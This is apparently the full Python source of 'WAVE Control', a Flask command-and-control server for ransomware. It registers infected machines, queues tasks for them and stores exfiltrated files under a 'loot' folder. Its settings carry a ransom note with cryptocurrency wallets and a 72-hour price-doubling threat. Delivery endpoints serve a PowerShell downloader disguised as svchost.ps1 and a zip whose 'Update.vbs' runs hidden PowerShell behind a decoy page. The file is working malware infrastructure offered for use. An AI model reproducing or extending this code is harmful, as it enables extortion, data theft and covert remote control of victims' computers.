# -*- coding: utf-8 -*-
import os, sqlite3, json, base64, datetime, io, zipfile, re
from flask import Flask, request, jsonify, render_template, redirect, url_for, flash, send_file, Response
from werkzeug.middleware.proxy_fix import ProxyFix

DB_PATH = os.environ.get('WAVE_DB', 'wave.db')
ADMIN_PASS = os.environ.get('ADMIN_PASS', 'admin')
APP_TITLE = os.environ.get('APP_TITLE', 'WAVE Control')

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(16))
app.wsgi_app = ProxyFix(app.wsgi_app)

SCHEMA = """
CREATE TABLE IF NOT EXISTS agents (
  id TEXT PRIMARY KEY,
  created_at TEXT,
  last_seen TEXT,
  hostname TEXT,
  username TEXT,
  os TEXT,
  ip TEXT,
  version TEXT,
  note TEXT,
  status TEXT
);
CREATE TABLE IF NOT EXISTS tasks (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  agent_id TEXT,
  type TEXT,
  args TEXT,
  status TEXT,
  created_at TEXT,
  updated_at TEXT,
  result BLOB
);
CREATE TABLE IF NOT EXISTS settings (
  key TEXT PRIMARY KEY,
  value TEXT
);
CREATE TABLE IF NOT EXISTS campaigns (
  slug TEXT PRIMARY KEY,
  label TEXT,
  mode TEXT,
  filename TEXT,
  created_at TEXT
);
"""

DEFAULT_SETTINGS = {
  'btc_address': 'bc1qqexample0000000000000000000000000000000',
  'eth_address': '0x1111111111111111111111111111111111111111',
  'xmr_address': '49exampleMoneroAddress111111111111111111111111111111111111111111111111',
  'sol_address': '5ExampleSolanaBase58Address1111111111111111111111111',
  'trx_address': 'TVjsExampleTRXAddress11111111111111',
  'ltc_address': 'ltc1qexampleabcdefghijklmnopqrstuvwxyz00000000',
  'doge_address': 'DExampleDogeAddress111111111111111111',
  'xrp_address': 'rExampleXRPAddress1111111111111111',
  'xlm_address': 'GEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEX',
  'ada_address': 'addr1qexampleexampleexampleexampleexampleexampleexample',
  'ransom_extension': '.wave',
  'ransom_amount_usd': '5000',
  'ransom_note': ('Your files have been encrypted by WAVE.\n\n'
                  'To recover them, pay the amount listed to one of the provided wallets.\n'
                  'BTC: {btc}\nETH: {eth}\nXMR: {xmr}\nSOL: {sol}\nTRX: {trx}\nDOGE: {doge}\nXRP: {xrp}\nXLM: {xlm}\nADA: {ada}\n\n'
                  'After payment, contact support with your ID: {agent_id}.\n'
                  'You have 72 hours before the price doubles.'),
  'clip_hijack_enable': 'false'
}


def now_iso():
    return datetime.datetime.utcnow().isoformat(timespec='seconds') + 'Z'


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def _col_exists(cursor, table, col):
    rows = cursor.execute(f"PRAGMA table_info({table})").fetchall()
    return any(r[1] == col for r in rows)


def init_db():
    conn = get_db()
    c = conn.cursor()
    for stmt in SCHEMA.strip().split(';'):
        s = stmt.strip()
        if s:
            c.execute(s)
    # Add columns for campaigns if missing
    try:
        if not _col_exists(c, 'campaigns', 'armed'):
            c.execute("ALTER TABLE campaigns ADD COLUMN armed INTEGER DEFAULT 0")
        if not _col_exists(c, 'campaigns', 'decoy_url'):
            c.execute("ALTER TABLE campaigns ADD COLUMN decoy_url TEXT DEFAULT ''")
    except Exception:
        pass
    for k, v in DEFAULT_SETTINGS.items():
        c.execute('INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)', (k, v))
    conn.commit()
    conn.close()

# initialize at import (Flask 3)
init_db()

# Utility settings helpers

def settings_get_all():
    conn = get_db(); c = conn.cursor()
    rows = c.execute('SELECT key, value FROM settings').fetchall()
    conn.close()
    return {r['key']: r['value'] for r in rows}


def settings_set(key, value):
    conn = get_db(); c = conn.cursor()
    c.execute('INSERT INTO settings(key,value) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value', (key, value))
    conn.commit(); conn.close()

# campaigns helpers

def campaigns_all():
    conn = get_db(); c = conn.cursor()
    rows = c.execute('SELECT * FROM campaigns ORDER BY created_at DESC').fetchall()
    conn.close()
    return rows


def campaign_create(slug, label, mode, filename, decoy_url=''):
    conn = get_db(); c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO campaigns(slug,label,mode,filename,created_at,armed,decoy_url) VALUES(?,?,?,?,?,?,?)',
              (slug, label, mode, filename, now_iso(), 0, decoy_url))
    conn.commit(); conn.close()

def campaign_set_arm(slug, armed=True):
    conn = get_db(); c = conn.cursor()
    c.execute('UPDATE campaigns SET armed=? WHERE slug=?', (1 if armed else 0, slug))
    conn.commit(); conn.close()

# Admin auth

def check_auth(req):
    token = req.args.get('p') or req.form.get('p') or req.headers.get('X-Admin')
    return token == ADMIN_PASS

@app.route('/')
def index():
    return redirect(url_for('admin'))

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not check_auth(request):
        return render_template('auth.html', title=APP_TITLE)
    conn = get_db(); c = conn.cursor()
    agents = c.execute('SELECT * FROM agents ORDER BY last_seen DESC').fetchall()
    settings = settings_get_all()
    tasks = c.execute('SELECT * FROM tasks ORDER BY id DESC LIMIT 100').fetchall()
    camps = campaigns_all()
    return render_template('admin.html', title=APP_TITLE, agents=agents, settings=settings, tasks=tasks, camps=camps)

@app.post('/admin/update_settings')
def admin_update_settings():
    if not check_auth(request):
        return 'forbidden', 403
    for k in DEFAULT_SETTINGS.keys():
        if k in request.form:
            settings_set(k, request.form[k])
    flash('Settings updated', 'ok')
    return redirect(url_for('admin', p=request.form.get('p')))

@app.post('/admin/queue/<agent_id>')
def admin_queue(agent_id):
    if not check_auth(request):
        return 'forbidden', 403
    ttype = request.form.get('type')
    args = request.form.get('args') or '{}'
    try:
        json.loads(args)
    except Exception:
        args = json.dumps({'raw': args})
    conn = get_db(); c = conn.cursor()
    c.execute('INSERT INTO tasks(agent_id,type,args,status,created_at,updated_at) VALUES(?,?,?,?,?,?)',
              (agent_id, ttype, args, 'queued', now_iso(), now_iso()))
    conn.commit(); conn.close()
    flash(f'Queued task {ttype} for {agent_id}', 'ok')
    return redirect(url_for('admin', p=request.form.get('p')))

@app.get('/admin/view/<int:task_id>')
def admin_view_task(task_id):
    if not check_auth(request):
        return 'forbidden', 403
    conn = get_db(); c = conn.cursor()
    t = c.execute('SELECT * FROM tasks WHERE id=?', (task_id,)).fetchone()
    conn.close()
    if not t: return 'not found', 404
    result_b64 = base64.b64encode(t['result'] or b'').decode()
    return render_template('task.html', title=APP_TITLE, t=t, result_b64=result_b64)

@app.post('/admin/campaigns')
def admin_campaigns_create():
    if not check_auth(request):
        return 'forbidden', 403
    slug = (request.form.get('slug') or '').strip()
    label = (request.form.get('label') or '').strip() or slug
    mode = request.form.get('mode') or 'ps1'
    filename = (request.form.get('filename') or '').strip() or ('Update.ps1' if mode=='ps1' else 'Document_Update.zip')
    decoy_url = (request.form.get('decoy_url') or '').strip()
    if not slug:
        flash('Slug required', 'err')
        return redirect(url_for('admin', p=request.form.get('p')))
    campaign_create(slug, label, mode, filename, decoy_url)
    flash(f'Campaign {slug} created', 'ok')
    return redirect(url_for('admin', p=request.form.get('p')))

@app.post('/admin/campaigns/arm/<slug>')
def admin_campaigns_arm(slug):
    if not check_auth(request):
        return 'forbidden', 403
    action = request.form.get('action','arm')
    campaign_set_arm(slug, armed=(action=='arm'))
    flash(f'Campaign {slug} -> {action}', 'ok')
    return redirect(url_for('admin', p=request.form.get('p')))

@app.get('/raw/agent.py')
def raw_agent():
    base = request.host_url.rstrip('/')
    campaign = request.args.get('campaign') or ''
    payload_path = os.path.join(os.path.dirname(__file__), 'payload_win.py')
    src = open(payload_path, 'r', encoding='utf-8').read()
    src = src.replace("C2 = os.environ.get('WAVE_C2', 'http://127.0.0.1:5000')",
                      f"C2 = os.environ.get('WAVE_C2', '{base}')")
    if campaign:
        if re.search(r"^CAMPAIGN\s*=", src, re.M):
            src = re.sub(r"^CAMPAIGN\s*=.*$", f"CAMPAIGN = '{campaign}'", src, flags=re.M)
        else:
            src = src.replace('AGENT_ID = None', f"AGENT_ID = None\nCAMPAIGN = '{campaign}'")
    tmp = 'agent_dynamic.py'
    open(tmp, 'w', encoding='utf-8').write(src)
    return send_file(tmp, as_attachment=True, download_name='agent.py')

@app.get('/healthz')
def healthz():
    return jsonify({'ok': True})

# --- Campaign delivery endpoints ---

def _ps_loader(base_url, slug):
    ps = (
        "$wc=New-Object System.Net.WebClient;"
        f"$u='{base_url}/raw/agent.py?campaign={slug}';"
        "$t=$env:TEMP+'\\svchost.ps1';$wc.DownloadFile($u,$t);"
        "python $t"
    )
    return ps

@app.get('/ps/<slug>')
def ps_one_liner(slug):
    base = request.host_url.rstrip('/')
    ps = _ps_loader(base, slug)
    return Response(ps, mimetype='text/plain')

@app.get('/dl/<slug>')
def dl_campaign(slug):
    conn = get_db(); c = conn.cursor()
    camp = c.execute('SELECT * FROM campaigns WHERE slug=?', (slug,)).fetchone()
    conn.close()
    if not camp:
        return Response('<html><title>Not Found</title><h1>404 Not Found</h1></html>', mimetype='text/html', status=404)
    mode = camp['mode']; filename = camp['filename']; armed = int(camp['armed'] or 0); decoy_url = camp['decoy_url'] or ''
    base = request.host_url.rstrip('/')
    if not armed:
        if decoy_url:
            return redirect(decoy_url, code=302)
        return Response('<html><title>Not Found</title><h1>404 Not Found</h1></html>', mimetype='text/html', status=404)
    if mode == 'ps1':
        ps = _ps_loader(base, slug)
        return Response(ps, mimetype='application/octet-stream', headers={'Content-Disposition': f"attachment; filename={filename}"})
    elif mode == 'zip':
        ps = _ps_loader(base, slug)
        vbs = (
            'Set o = CreateObject("WScript.Shell")\n'
            'cmd = "powershell -NoP -W Hidden -C ""' + ps.replace('"','\"') + '""\n'
            'o.Run cmd,0\n' +
            (f'o.Run "cmd /c start {decoy_url}",0\n' if decoy_url else '')
        )
        mem = io.BytesIO()
        with zipfile.ZipFile(mem, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr('Update.vbs', vbs)
            z.writestr('README.txt', 'Double click Update.vbs to apply the update.')
        mem.seek(0)
        return send_file(mem, mimetype='application/zip', as_attachment=True, download_name=filename)
    else:
        ps = _ps_loader(base, slug)
        return Response(ps, mimetype='application/octet-stream', headers={'Content-Disposition': f"attachment; filename={filename or 'Update.bin'}"})

# --- C2 API ---
@app.post('/api/register')
def api_register():
    data = request.get_json(force=True, silent=True) or {}
    agent_id = data.get('id') or base64.urlsafe_b64encode(os.urandom(9)).decode().rstrip('=')
    conn = get_db(); c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO agents(id, created_at, last_seen, hostname, username, os, ip, version, note, status)\n              VALUES(?,?,?,?,?,?,?,?,?,?)',
              (agent_id, now_iso(), now_iso(), data.get('hostname'), data.get('username'), data.get('os'),
               request.remote_addr, data.get('version','1'), data.get('campaign',''), 'online'))
    c.execute('UPDATE agents SET last_seen=?, hostname=?, username=?, os=?, ip=?, version=?, note=?, status=? WHERE id=?',
              (now_iso(), data.get('hostname'), data.get('username'), data.get('os'), request.remote_addr, data.get('version','1'), data.get('campaign',''), 'online', agent_id))
    conn.commit(); conn.close()
    settings = settings_get_all()
    return jsonify({'id': agent_id, 'settings': settings})

@app.post('/api/poll')
def api_poll():
    data = request.get_json(force=True, silent=True) or {}
    agent_id = data.get('id')
    if not agent_id:
        return jsonify({'error': 'missing id'}), 400
    conn = get_db(); c = conn.cursor()
    c.execute('UPDATE agents SET last_seen=?, status=? WHERE id=?', (now_iso(), 'online', agent_id))
    rows = c.execute('SELECT * FROM tasks WHERE agent_id=? AND status=? ORDER BY id ASC', (agent_id, 'queued')).fetchall()
    tasks = []
    for r in rows:
        tasks.append({'id': r['id'], 'type': r['type'], 'args': json.loads(r['args'] or '{}')})
        c.execute('UPDATE tasks SET status=?, updated_at=? WHERE id=?', ('sent', now_iso(), r['id']))
    conn.commit(); conn.close()
    return jsonify({'tasks': tasks})

@app.post('/api/result')
def api_result():
    data = request.get_json(force=True, silent=True) or {}
    task_id = data.get('task_id')
    status = data.get('status', 'done')
    result = base64.b64decode(data.get('result','')) if data.get('result') else b''
    conn = get_db(); c = conn.cursor()
    c.execute('UPDATE tasks SET status=?, updated_at=?, result=? WHERE id=?', (status, now_iso(), result, task_id))
    conn.commit(); conn.close()
    return jsonify({'ok': True})

@app.post('/api/upload')
def api_upload():
    agent_id = request.args.get('id') or request.form.get('id')
    path = request.args.get('path') or request.form.get('path') or 'blob.bin'
    blob = request.files.get('file')
    if not blob or not agent_id:
        return 'missing', 400
    outdir = os.path.join('loot', agent_id)
    os.makedirs(outdir, exist_ok=True)
    save_path = os.path.join(outdir, os.path.basename(path))
    blob.save(save_path)
    return jsonify({'saved': save_path})

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', '5000')))
